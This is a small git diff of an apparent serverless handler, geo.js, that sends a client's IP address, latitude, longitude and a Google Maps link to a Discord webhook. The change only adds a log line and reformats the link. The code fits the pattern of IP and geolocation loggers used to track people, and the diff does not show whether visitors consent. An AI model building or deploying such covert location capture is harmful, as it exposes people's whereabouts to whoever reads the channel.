@@ -1,5 +1,7 @@
 export async function onRequestPost({ request, env }) {
   try {
+    console.log("geo.js invoked");
+
     const data = await request.json();
     const lat = data.lat;
     const lon = data.lon;
@@ -20,7 +22,7 @@ export async function onRequestPost({ request, env }) {
 **IP:** ${ip}
 **Latitude:** ${lat}
 **Longitude:** ${lon}
-📍 https://www.google.com/maps?q=${lat},${lon}`
+📍 [Google Maps](https://www.google.com/maps?q=${lat},${lon})`
     };
 
     const webhookRes = await fetch(env.DISCORD_WEBHOOK, {
